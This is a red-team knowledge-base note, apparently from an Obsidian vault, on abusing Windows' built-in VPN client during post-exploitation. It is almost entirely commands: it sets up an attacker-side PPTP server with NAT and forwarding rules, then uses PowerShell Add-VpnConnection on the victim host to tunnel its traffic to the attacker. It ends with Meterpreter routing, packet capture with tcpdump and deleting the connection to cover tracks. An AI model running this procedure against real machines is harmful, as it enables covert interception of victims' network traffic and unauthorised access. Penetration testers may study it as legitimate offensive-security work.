# Living off the Land

Install the dependency according to your package manager.

```
# apt install -y pptpd
```

For `localip` just include the gateway IP and `remoteip` just specify the available IP ranges that isn't occupied in the current subnet network.

```
# cat /etc/pptpd.conf
localip 192.168.0.1
remoteip 192.168.0.234-238
..[omitted]..
```

Specify the credentials.

```
# cat /etc/ppp/chap-secrets
# Secrets for authentication using CHAP
# client	server	secret			IP addresses
<username>  *       <password>      *
```

Create the firewall rules to accept incoming and outgoing PPTP network traffic.

```
# iptables -t nat -A POSTROUTING -o enp7s0 -j MASQUERADE
iptables -A FORWARD -i ppp0 -o enp7s0 -j ACCEPT
iptables -A FORWARD -i enp7s0 -o ppp0 -m state --state ESTABLISHED,RELATED -j ACCEPT
```

Enable port forwarding.

```
# echo 1 > /proc/sys/net/ipv4/ip_forward
```

Restart PPTP daemon service and check network statistics for the listening port.

```
# systemctl restart pptpd

# ss -antpl | grep :1723
```

```
$ ip address show enp7s0

# ip route
```

Then execute post module to make the target connect to the attacker's VPN tunnel.

```
PS C:\> Add-VpnConnection -Name "<vpn_name>" -ServerAddress <VPN_server_IP> -TunnelType PPTP -EncryptionLevel Required -PassThru
```

```
PS C:\> Add-VpnConnection -Name "<vpn_name>" -ServerAddress <VPN_server_IP> -TunnelType L2TP -EncryptionLevel Required -PassThru -L2tpPsk "<password>" -Confirm:$false -Force
```

Then the victim should be authenticated in the attacker's VPN tunnel.

```
PS C:\> Get-VpnConnection -Name "<vpn_name>"
```

You can check the route network that contains the same configuration file (`/etc/pptpd.conf`) from `remoteip`.

```
metepreter > route
```

Intercept the packets.

```
# tcpdump -i <interface>
```

Delete the VPN connection.

```
PS C:\> Get-VpnConnection -Name "<vpn_name>" | Remove-VpnConnection -Force -Confirm:$false
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x08 - Maintaining Access/Gathering Information/Windows/WireTap/MITM/C2 Frameworks/Metasploit]]

### Microsoft

- [Powershell Module: `Add-VpnConnection`](https://learn.microsoft.com/en-us/powershell/module/vpnclient/add-vpnconnection?view=windowsserver2025-ps)

### TrustedSec

- [TrustedSec: Abusing Windows Built-in VPN Providers](https://trustedsec.com/blog/abusing-windows-built-in-vpn-providers)